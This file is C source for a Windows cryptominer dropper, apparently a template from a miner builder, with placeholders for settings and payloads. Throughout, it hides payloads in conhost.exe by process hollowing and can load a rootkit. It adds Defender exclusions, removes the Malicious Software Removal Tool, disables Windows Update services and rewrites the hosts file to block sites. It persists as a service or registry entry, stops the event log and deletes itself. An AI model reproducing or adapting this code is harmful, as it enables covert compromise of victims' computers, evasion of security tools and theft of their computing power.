#include "ntddk.h"

#include "common.h"
#include "obfuscateu.h"
#include "inject.h"

void inject_process(wchar_t* mutex, BYTE* payload, size_t payloadSize, wchar_t* programPath, wchar_t* cmdLine, wchar_t* startDir, wchar_t* runtimeData, bool setCritical) {
    if (!check_mutex(mutex)) {
        size_t out_len;
        unsigned char* payloadDecryped = resource_decrypt(payload, payloadSize, &out_len);
        HANDLE pHandle = process_hollowing(programPath, cmdLine, runtimeData, payloadDecryped, startDir);
        resource_free(payloadDecryped, out_len);
        if (pHandle != INVALID_HANDLE_VALUE) {
#if DefProcessProtect
            if (setCritical) {
                ULONG breakStatus = true;
                UtSetInformationProcess(pHandle, (PROCESSINFOCLASS)0x1d, &breakStatus, AYU_OBFC(sizeof(ULONG)));
            }
#endif
            UtClose(pHandle);
        }
    }
}

#if DefBlockWebsites
void add_to_hosts(char* hostsData, ULONG* hostsSize, char* domain, ULONG domainSize) {
    if (strstr(hostsData, domain) == NULL) {
        strcat(hostsData, AYU_OBFA("\r\n0.0.0.0      "));
        strcat(hostsData, domain);
        *hostsSize += domainSize;
    }
}
#endif

$RESOURCES

int main(int argc, char *argv[])
{
    UNICODE_STRING umutex = init_unicode_string(AYU_OBFW(L"\\BaseNamedObjects\\#MUTEXMINER"));
    OBJECT_ATTRIBUTES attr;
    InitializeObjectAttributes(&attr, &umutex, 0, NULL, NULL);

    HANDLE hMutex;
    if (!NT_SUCCESS(UtCreateMutant(&hMutex, AYU_OBFC(MUTANT_ALL_ACCESS), &attr, TRUE))) {
        return 0;
    }

    bool isAdmin = check_administrator();

    PUT_PEB_EXT peb = (PUT_PEB_EXT)SWU_GetPEB();
    wchar_t* pebenv = (wchar_t*)peb->ProcessParameters->Environment;

    wchar_t exePath[MAX_PATH] = { 0 };
    wcscat(exePath, ((PRTL_USER_PROCESS_PARAMETERS)peb->ProcessParameters)->ImagePathName.Buffer);

    wchar_t sysdir[MAX_PATH] = { 0 };
    combine_path(sysdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")), AYU_OBFW(L"\\system32"));

    wchar_t powershellPath[MAX_PATH] = { 0 };
    combine_path(powershellPath, sysdir, AYU_OBFW(L"\\WindowsPowerShell\\v1.0\\powershell.exe"));

#if DefRunAsAdministrator
    if (!isAdmin) {
        run_program(false, sysdir, powershellPath, AYU_OBFW(L"%S Start-Process \"%S\" -Verb runAs"), powershellPath, exePath);
        return 0;
    }
#endif

#if DefStartDelay
#if DefStartup
    wchar_t startupPath[MAX_PATH] = { 0 };
    combine_path(startupPath, get_env(pebenv, isAdmin ? AYU_OBFW(L"PROGRAMDATA=") : AYU_OBFW(L"$BASEDIR")), AYU_OBFW(L"#STARTUPFILE"));
    if (wcsicmp(exePath, startupPath) != 0) {
#endif
        LARGE_INTEGER sleeptime;
        sleeptime.QuadPart = -(AYU_OBFC($STARTDELAY * 10000));
        UtDelayExecution(FALSE, &sleeptime);
#if DefStartup
}
#endif
#endif
    
    wchar_t cmdPath[MAX_PATH] = { 0 };
    combine_path(cmdPath, sysdir, AYU_OBFW(L"\\cmd.exe"));

    wchar_t conhostPath[MAX_PATH] = { 0 };
    combine_path(conhostPath, sysdir, AYU_OBFW(L"#CONHOSTPATH"));

    wchar_t scPath[MAX_PATH] = { 0 };
    combine_path(scPath, sysdir, AYU_OBFW(L"\\sc.exe"));
    
#if DefWDExclusions
    run_program(true, sysdir, powershellPath, AYU_OBFW(L"%S #WDCOMMAND"), powershellPath);
    run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c wusa /uninstall /kb:890830 /quiet /norestart"), cmdPath);
    wchar_t msrtPath[MAX_PATH] = { 0 };
    combine_path(msrtPath, sysdir, AYU_OBFW(L"\\MRT.exe"));
    delete_file(msrtPath);

    HANDLE hMSRTKey = NULL;
    UNICODE_STRING regKey = init_unicode_string(AYU_OBFW(L"\\Registry\\Machine\\SOFTWARE\\Policies\\Microsoft\\MRT"));
    InitializeObjectAttributes(&attr, &regKey, AYU_OBFC(OBJ_CASE_INSENSITIVE), NULL, NULL);

    if (!NT_SUCCESS(UtOpenKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr))) {
        UtCreateKey(&hMSRTKey, AYU_OBFC(KEY_QUERY_VALUE | KEY_SET_VALUE), &attr, 0, NULL, AYU_OBFC(REG_OPTION_NON_VOLATILE), NULL);
    }

    if (hMSRTKey) {
        DWORD disableMSRT = 1;
        UNICODE_STRING uvalue = init_unicode_string(AYU_OBFW(L"DontOfferThroughWUAU"));
        UtSetValueKey(hMSRTKey, &uvalue, 0, AYU_OBFC(REG_DWORD), &disableMSRT, AYU_OBFC(sizeof(DWORD)));
        UtClose(hMSRTKey);
    }
#endif

#if DefDisableWindowsUpdate
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop UsoSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop WaaSMedicSvc"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop wuauserv"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop bits"), scPath);
    run_program(true, sysdir, scPath, AYU_OBFW(L"%S stop dosvc"), scPath);
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\UsoSvc"), AYU_OBFW(L"UsoSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\WaaSMedicSvc"), AYU_OBFW(L"WaaSMedicSvc_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\wuauserv"), AYU_OBFW(L"wuauserv_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\BITS"), AYU_OBFW(L"BITS_bkp"));
    rename_key_registry(AYU_OBFW(L"\\Registry\\Machine\\SYSTEM\\CurrentControlSet\\Services\\dosvc"), AYU_OBFW(L"dosvc_bkp"));
#endif

#if DefDisableSleep
    wchar_t powercfgPath[MAX_PATH] = { 0 };
    combine_path(powercfgPath, sysdir, AYU_OBFW(L"\\powercfg.exe"));
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -hibernate-timeout-dc 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-ac 0"), powercfgPath);
    run_program(false, sysdir, powercfgPath, AYU_OBFW(L"%S /x -standby-timeout-dc 0"), powercfgPath);
#endif

#if DefBlockWebsites
    wchar_t hostsPath[MAX_PATH] = { 0 };
    combine_path(hostsPath, sysdir, AYU_OBFW(L"\\drivers\\etc\\hosts"));
    ULONG hostsFileSize = 0;
    PVOID hostsFile = read_file(hostsPath, &hostsFileSize);
    if (hostsFileSize > 0) {
        PVOID hostsData = NULL;
        SIZE_T allocatedSize = hostsFileSize + AYU_OBFC($DOMAINSIZE);
        if (NT_SUCCESS(UtAllocateVirtualMemory(UtCurrentProcess(), &hostsData, 0, &allocatedSize, AYU_OBFC(MEM_RESERVE | MEM_COMMIT), AYU_OBFC(PAGE_READWRITE)))) {
            strcpy((char*)hostsData, (char*)hostsFile);
            $CPPDOMAINSET
            write_file(hostsPath, hostsData, hostsFileSize);
            UtFreeVirtualMemory(UtCurrentProcess(), &hostsData, &allocatedSize, AYU_OBFC(MEM_RELEASE));
        }
        UtFreeVirtualMemory(UtCurrentProcess(), &hostsFile, &allocatedSize, AYU_OBFC(MEM_RELEASE));
    }
#endif

#if DefRootkit
    inject_process(NULL, (BYTE*)resRootkit, resRootkitSize, conhostPath, conhostPath, sysdir, nullptr, false);
#endif

    bool debugPriv = false;
#if DefProcessProtect
    TOKEN_PRIVILEGES privilege = { 1, { 0x14, 0, SE_PRIVILEGE_ENABLED } };

    HANDLE hToken = NULL;
    if (NT_SUCCESS(UtOpenProcessToken(UtCurrentProcess(), AYU_OBFC(TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY), &hToken))) {
        debugPriv = NT_SUCCESS(UtAdjustPrivilegesToken(hToken, 0, &privilege, AYU_OBFC(sizeof(privilege)), NULL, NULL));
        UtClose(hToken);
    }
#endif

#if DefStartup
    if (isAdmin) {
        if (!install_check(startupPath)) {
            run_program(true, sysdir, scPath, AYU_OBFW(L"%S delete \"#STARTUPENTRYNAME\""), scPath);
            run_program(true, sysdir, scPath, AYU_OBFW(L"%S create \"#STARTUPENTRYNAME\" binpath= \"%S\" start= \"auto\""), scPath, startupPath);
        }
    }
    else {
        wchar_t regPath[MAX_PATH] = { 0 };
        combine_path(regPath, sysdir, AYU_OBFW(L"\\reg.exe"));
        run_program(true, sysdir, regPath, AYU_OBFW(L"%S #STARTUPADDUSER"), regPath, startupPath);
    }

    if (wcsicmp(exePath, startupPath) != 0) {
        ULONG fileSize;
        PVOID exeFile = read_file(exePath, &fileSize);
        write_file(startupPath, exeFile, fileSize);
        SIZE_T memorySize = 0;
        UtFreeVirtualMemory(UtCurrentProcess(), &exeFile, &memorySize, AYU_OBFC(MEM_RELEASE));
#if DefRunInstall
        if (isAdmin) {
            run_program(false, sysdir, scPath, AYU_OBFW(L"%S stop eventlog"), scPath);
            run_program(false, sysdir, scPath, AYU_OBFW(L"%S start \"#STARTUPENTRYNAME\""), scPath);
        }
        else {
            run_program(false, sysdir, startupPath, AYU_OBFW(L"\"%S\""), startupPath);
        }
#endif
#if DefAutoDelete
        run_program(false, sysdir, cmdPath, AYU_OBFW(L"%S /c choice /C Y /N /D Y /T 3 & Del \"%S\""), cmdPath, exePath);
#endif
        return 0;
    }

#if DefWatchdog
    inject_process(AYU_OBFW(L"\\BaseNamedObjects\\#WATCHDOGID"), (BYTE*)resWatchdog, resWatchdogSize, conhostPath, conhostPath, sysdir, nullptr, true && debugPriv);
#endif
#endif
#if DefMineXMR
    write_resource(resWR64, resWR64Size, get_env(pebenv, AYU_OBFW(L"TEMP=")), AYU_OBFW(L"\\#WINRINGNAME"));
#endif
#if DefMineETH
    bool hasGPU = has_gpu();
#endif
    
    wchar_t rootdir[MAX_PATH] = { 0 };
    wcscat(rootdir, get_env(pebenv, AYU_OBFW(L"SYSTEMROOT=")));

    wchar_t injectPath[MAX_PATH] = { 0 };
    $MINERSET

    UtClose(hMutex);
	return 0;
} 